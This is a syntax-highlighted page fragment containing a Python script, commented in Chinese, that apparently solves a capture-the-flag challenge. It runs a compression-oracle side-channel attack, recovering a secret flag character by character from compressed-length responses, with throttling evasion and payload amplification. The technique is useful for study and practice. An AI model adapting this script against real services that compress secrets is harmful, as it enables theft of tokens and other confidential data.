</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>Fast compression-oracle blind recovery (no CLI).
</span></span></span><span class=line><span class=cl><span class=s2>- 两阶段选择：粗筛一遍 -&gt; 前K复测(取中位数)
</span></span></span><span class=line><span class=cl><span class=s2>- 自适应节流 + 长连接 + 进度持久化
</span></span></span><span class=line><span class=cl><span class=s2>- 可选“重复增强”以放大 gzip 命中差异
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span><span class=o>,</span> <span class=nn>time</span><span class=o>,</span> <span class=nn>json</span><span class=o>,</span> <span class=nn>urllib.parse</span><span class=o>,</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>requests.adapters</span> <span class=kn>import</span> <span class=n>HTTPAdapter</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib3.util.retry</span> <span class=kn>import</span> <span class=n>Retry</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>statistics</span> <span class=kn>import</span> <span class=n>median</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ================== 可调参数 ==================</span>
</span></span><span class=line><span class=cl><span class=n>BASE_URL</span>       <span class=o>=</span> <span class=s2>&#34;https://misc100-1.pointeroverflowctf.com&#34;</span>
</span></span><span class=line><span class=cl><span class=n>ORACLE_PATH</span>    <span class=o>=</span> <span class=s2>&#34;/oracle?q=&#34;</span>
</span></span><span class=line><span class=cl><span class=n>START_PREFIX</span>   <span class=o>=</span> <span class=s2>&#34;poctf{uwsp_&#34;</span>   <span class=c1># 你已知的前缀；若要从最开头，请改成 &#34;poctf{&#34;</span>
</span></span><span class=line><span class=cl><span class=n>MAXLEN</span>         <span class=o>=</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl><span class=n>OUT_PROGRESS</span>   <span class=o>=</span> <span class=s2>&#34;progress.json&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>CANDIDATES</span>     <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=s2>&#34;abcdefghijklmnopqrstuvwxyz0123456789_</span><span class=si>{}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>K_TOP</span>          <span class=o>=</span> <span class=mi>5</span>            <span class=c1># 进入复测的候选个数（粗筛后取前 K）</span>
</span></span><span class=line><span class=cl><span class=n>RECHECK_TIMES</span>  <span class=o>=</span> <span class=mi>3</span>            <span class=c1># 复测次数（取中位数做评分）</span>
</span></span><span class=line><span class=cl><span class=n>REQUEST_TIMEOUT</span><span class=o>=</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>BASE_DELAY</span>     <span class=o>=</span> <span class=mf>0.20</span>         <span class=c1># 基本间隔(秒)</span>
</span></span><span class=line><span class=cl><span class=n>JITTER</span>         <span class=o>=</span> <span class=mf>0.05</span>         <span class=c1># 抖动(秒)</span>
</span></span><span class=line><span class=cl><span class=n>BACKOFF_FACTOR</span> <span class=o>=</span> <span class=mf>0.7</span>
</span></span><span class=line><span class=cl><span class=n>MAX_RETRIES</span>    <span class=o>=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># “重复增强”系数：把 payload 重复 N 次拼接（很多 gzip 题有效）</span>
</span></span><span class=line><span class=cl><span class=n>AMPLIFY</span>        <span class=o>=</span> <span class=mi>2</span>            <span class=c1># 建议 2~4；如服务器较脆弱设为 1 关闭</span>
</span></span><span class=line><span class=cl><span class=c1># =============================================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># —— 会话与请求 —— #</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_session</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>retries</span> <span class=o>=</span> <span class=n>Retry</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>total</span><span class=o>=</span><span class=n>MAX_RETRIES</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>backoff_factor</span><span class=o>=</span><span class=n>BACKOFF_FACTOR</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>status_forcelist</span><span class=o>=</span><span class=p>[</span><span class=mi>429</span><span class=p>,</span> <span class=mi>500</span><span class=p>,</span> <span class=mi>502</span><span class=p>,</span> <span class=mi>503</span><span class=p>,</span> <span class=mi>504</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=n>allowed_methods</span><span class=o>=</span><span class=nb>frozenset</span><span class=p>([</span><span class=s2>&#34;GET&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>mount</span><span class=p>(</span><span class=s2>&#34;https://&#34;</span><span class=p>,</span> <span class=n>HTTPAdapter</span><span class=p>(</span><span class=n>max_retries</span><span class=o>=</span><span class=n>retries</span><span class=p>,</span> <span class=n>pool_connections</span><span class=o>=</span><span class=mi>16</span><span class=p>,</span> <span class=n>pool_maxsize</span><span class=o>=</span><span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>mount</span><span class=p>(</span><span class=s2>&#34;http://&#34;</span><span class=p>,</span>  <span class=n>HTTPAdapter</span><span class=p>(</span><span class=n>max_retries</span><span class=o>=</span><span class=n>retries</span><span class=p>,</span> <span class=n>pool_connections</span><span class=o>=</span><span class=mi>16</span><span class=p>,</span> <span class=n>pool_maxsize</span><span class=o>=</span><span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>update</span><span class=p>({</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;poctf-oracle-fast/2.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Accept&#34;</span><span class=p>:</span> <span class=s2>&#34;application/json&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Connection&#34;</span><span class=p>:</span> <span class=s2>&#34;keep-alive&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encode_payload</span><span class=p>(</span><span class=n>p</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 允许自定义放大：把猜测串重复拼接，放大压缩器“词典命中”差异</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>AMPLIFY</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>p</span> <span class=o>*</span> <span class=n>AMPLIFY</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote_plus</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>safe</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>oracle_len</span><span class=p>(</span><span class=n>sess</span><span class=p>,</span> <span class=n>payload</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;调用 /oracle 返回 compressed_len&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span> <span class=o>=</span> <span class=n>encode_payload</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>BASE_URL</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>ORACLE_PATH</span> <span class=o>+</span> <span class=n>q</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>sess</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=n>REQUEST_TIMEOUT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>429</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># 遵循 Retry-After 或指数退避</span>
</span></span><span class=line><span class=cl>        <span class=n>ra</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;Retry-After&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>wait</span> <span class=o>=</span> <span class=nb>float</span><span class=p>(</span><span class=n>ra</span><span class=p>)</span> <span class=k>if</span> <span class=n>ra</span> <span class=k>else</span> <span class=n>BACKOFF_FACTOR</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[429] rate-limited, sleep </span><span class=si>{</span><span class=n>wait</span><span class=si>:</span><span class=s2>.2f</span><span class=si>}</span><span class=s2>s&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=n>wait</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># 再试一次（交给会话重试策略去兜底）</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>sess</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=n>REQUEST_TIMEOUT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>raise_for_status</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=s2>&#34;compressed_len&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># —— 轻量缓存：相同候选不重复请求 —— #</span>
</span></span><span class=line><span class=cl><span class=n>cache</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>score_once</span><span class=p>(</span><span class=n>sess</span><span class=p>,</span> <span class=n>guess</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>guess</span> <span class=ow>in</span> <span class=n>cache</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>cache</span><span class=p>[</span><span class=n>guess</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>v</span> <span class=o>=</span> <span class=n>oracle_len</span><span class=p>(</span><span class=n>sess</span><span class=p>,</span> <span class=n>guess</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cache</span><span class=p>[</span><span class=n>guess</span><span class=p>]</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># —— 进度保存/恢复 —— #</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>save_progress</span><span class=p>(</span><span class=n>prefix</span><span class=p>:</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>OUT_PROGRESS</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>json</span><span class=o>.</span><span class=n>dump</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;base&#34;</span><span class=p>:</span> <span class=n>BASE_URL</span><span class=p>,</span> <span class=s2>&#34;prefix&#34;</span><span class=p>:</span> <span class=n>prefix</span><span class=p>,</span> <span class=s2>&#34;ts&#34;</span><span class=p>:</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=n>f</span><span class=p>,</span> <span class=n>ensure_ascii</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>indent</span><span class=o>=</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>load_progress</span><span class=p>(</span><span class=n>default_prefix</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>OUT_PROGRESS</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;base&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=n>BASE_URL</span> <span class=ow>and</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;prefix&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>default_prefix</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>data</span><span class=p>[</span><span class=s2>&#34;prefix&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>default_prefix</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># —— 主逻辑 —— #</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pick_best_char</span><span class=p>(</span><span class=n>sess</span><span class=p>,</span> <span class=n>prefix</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    两阶段：
</span></span></span><span class=line><span class=cl><span class=s2>    1) 粗筛：对所有候选各测1次，取最小压缩长度的前K
</span></span></span><span class=line><span class=cl><span class=s2>    2) 复测：对前K各测 RECHECK_TIMES 次，取中位数；再选最小者
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 随机化顺序，避免服务器缓存/频率偏置</span>
</span></span><span class=line><span class=cl>    <span class=n>cand</span> <span class=o>=</span> <span class=n>CANDIDATES</span><span class=p>[:]</span>
</span></span><span class=line><span class=cl>    <span class=n>random</span><span class=o>.</span><span class=n>shuffle</span><span class=p>(</span><span class=n>cand</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 粗筛</span>
</span></span><span class=line><span class=cl>    <span class=n>scores</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>ch</span> <span class=ow>in</span> <span class=n>cand</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>prefix</span> <span class=o>+</span> <span class=n>ch</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>v</span> <span class=o>=</span> <span class=n>score_once</span><span class=p>(</span><span class=n>sess</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 失败给大数，避免误选</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] probe &#39;</span><span class=si>{</span><span class=n>ch</span><span class=si>}</span><span class=s2>&#39; failed: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>v</span> <span class=o>=</span> <span class=mi>10</span><span class=o>**</span><span class=mi>9</span>
</span></span><span class=line><span class=cl>        <span class=n>scores</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>ch</span><span class=p>,</span> <span class=n>v</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># 轻微抖动，降低节流</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=n>BASE_DELAY</span> <span class=o>+</span> <span class=n>random</span><span class=o>.</span><span class=n>uniform</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>JITTER</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 取前K</span>
</span></span><span class=line><span class=cl>    <span class=n>scores</span><span class=o>.</span><span class=n>sort</span><span class=p>(</span><span class=n>key</span><span class=o>=</span><span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=n>topk</span> <span class=o>=</span> <span class=n>scores</span><span class=p>[:</span><span class=n>K_TOP</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 复测</span>
</span></span><span class=line><span class=cl>    <span class=n>best_ch</span><span class=p>,</span> <span class=n>best_med</span> <span class=o>=</span> <span class=kc>None</span><span class=p>,</span> <span class=mi>10</span><span class=o>**</span><span class=mi>9</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>ch</span><span class=p>,</span> <span class=n>v0</span> <span class=ow>in</span> <span class=n>topk</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>vals</span> <span class=o>=</span> <span class=p>[</span><span class=n>v0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>RECHECK_TIMES</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>vals</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>oracle_len</span><span class=p>(</span><span class=n>sess</span><span class=p>,</span> <span class=n>prefix</span> <span class=o>+</span> <span class=n>ch</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] recheck &#39;</span><span class=si>{</span><span class=n>ch</span><span class=si>}</span><span class=s2>&#39; failed: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>vals</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=mi>10</span><span class=o>**</span><span class=mi>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=n>BASE_DELAY</span> <span class=o>+</span> <span class=n>random</span><span class=o>.</span><span class=n>uniform</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>JITTER</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>=</span> <span class=n>median</span><span class=p>(</span><span class=n>vals</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    &#39;</span><span class=si>{</span><span class=n>ch</span><span class=si>}</span><span class=s2>&#39; -&gt; median </span><span class=si>{</span><span class=n>m</span><span class=si>}</span><span class=s2> from </span><span class=si>{</span><span class=n>vals</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>m</span><span class=p>,</span> <span class=n>ch</span><span class=p>)</span> <span class=o>&lt;</span> <span class=p>(</span><span class=n>best_med</span><span class=p>,</span> <span class=n>best_ch</span> <span class=ow>or</span> <span class=s2>&#34;~&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>best_ch</span><span class=p>,</span> <span class=n>best_med</span> <span class=o>=</span> <span class=n>ch</span><span class=p>,</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] choose &#39;</span><span class=si>{</span><span class=n>best_ch</span><span class=si>}</span><span class=s2>&#39; (median=</span><span class=si>{</span><span class=n>best_med</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>best_ch</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>recover</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>sess</span> <span class=o>=</span> <span class=n>make_session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>prefix</span> <span class=o>=</span> <span class=n>load_progress</span><span class=p>(</span><span class=n>START_PREFIX</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Start/Resume: </span><span class=si>{</span><span class=n>prefix</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 可选：先测一下面线</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>base_line</span> <span class=o>=</span> <span class=n>oracle_len</span><span class=p>(</span><span class=n>sess</span><span class=p>,</span> <span class=n>prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[i] baseline(</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>prefix</span><span class=p>)</span><span class=si>}</span><span class=s2>): </span><span class=si>{</span><span class=n>base_line</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] initial probe failed: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>prefix</span><span class=p>)</span> <span class=o>&lt;</span> <span class=n>MAXLEN</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[&gt;] pos </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>prefix</span><span class=p>)</span><span class=si>}</span><span class=s2> …&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>ch</span> <span class=o>=</span> <span class=n>pick_best_char</span><span class=p>(</span><span class=n>sess</span><span class=p>,</span> <span class=n>prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>prefix</span> <span class=o>+=</span> <span class=n>ch</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[=] </span><span class=si>{</span><span class=n>prefix</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>save_progress</span><span class=p>(</span><span class=n>prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ch</span> <span class=o>==</span> <span class=s2>&#34;}&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[✓] Closing brace found. Done.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[FINAL] </span><span class=si>{</span><span class=n>prefix</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
